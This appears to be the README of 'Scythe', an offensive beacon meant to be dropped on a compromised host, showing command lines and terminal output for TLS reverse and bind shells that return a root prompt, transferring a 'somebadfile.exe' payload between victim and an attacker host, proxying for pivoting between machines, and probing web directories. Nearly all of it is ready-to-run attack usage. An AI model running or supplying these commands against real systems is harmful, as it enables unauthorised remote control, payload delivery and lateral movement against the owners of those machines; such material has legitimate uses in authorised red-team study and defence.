# Scythe
All in one beacon to drop on a compromised host


## Build

* Please look at github actions or just use the dockerfile to build for your platform.

## Netcat

Remember to use --proxy if you plan to pivot between hosts

### Reverse Shell

* Victim:

```
root@f44b79805a1e:~/cmd# ./ScytheLinux Netcat --address 172.17.0.2 --reverse --port 8000 --tls
2024/06/13 22:45:18 [*] Rev shell spawning, connecting to 172.17.0.2:8000
2024/06/13 22:45:18 Linux

```

* Attacker:

```
root@fcbc11f4beba:~/cmd# ./ScytheLinux Netcat --listen --port 8000 --tls 
2024/06/13 22:45:06 Listener opened on :8000
2024/06/13 22:45:09 Received connection from 172.17.0.3:57398!
whoami
root

```

### Bind Shell:

* Victim:

```
root@fcbc11f4beba:~/cmd# ./ScytheLinux Netcat --bind --port 8000 --tls
2024/06/13 22:45:57 [*] Binding shell spawning for remote code execution
2024/06/13 22:46:02 Received connection from 172.17.0.3:49050!

```

* Attacker:

```
root@f44b79805a1e:~/cmd# ./ScytheLinux Netcat --address 172.17.0.2 --caller --port 8000 --tls
2024/06/13 22:46:02 [*] Bind shell spawning, connecting to 172.17.0.2:8000
whoami
root

```

## File Transfer

### Download

* Victim

```
./Scythe.exe FileTransfer --download --filename somebadfile.exe --hostname 10.10.10.10 --port 8080 --tls
```

* Attacker

```
./Scythe FileTransfer --listen --port 8080 --tls
```


### Upload

* Attacker

```
./Scythe.exe FileTransfer --filename somebadfile.exe --port 8080 --send --tls
```

* Victim

```
./Scythe.exe FileTransfer --listen --filename somebadfile.exe --port 8080 --tls
```

## Proxy

* Proxy server

```
./Scythe Proxy --port 9050
```

* Victim Reverse Shell

```
./Scythe.exe Netcat --address 10.10.10.10 --reverse --port 8000 --proxy 172.17.0.2 --tls
```

* Attacker

```
./ScytheLinux Netcat --listen --port 8000 --tls
```

## HTTP

### HTTP Test Server

* Use this to test your HTTP requests.

```
virtualenv -p python3 ~/development/virtual_env/flask
source ~/development/virtual_env/flask/bin/activate
pip install flask
python3 -m http.server
```

* Use this command to test different requests
* Spin up a Listener and Proxy if you want to test those features

```
./Scythe Http --method GET --timeout 5s --url http://127.0.0.1:5000 --directories /index.js,/index.html,/first-dir/index.js,/first-dir/index.html,/command.js,/server.py,/first-dir/dir.js/server.py,/requirements.py
```
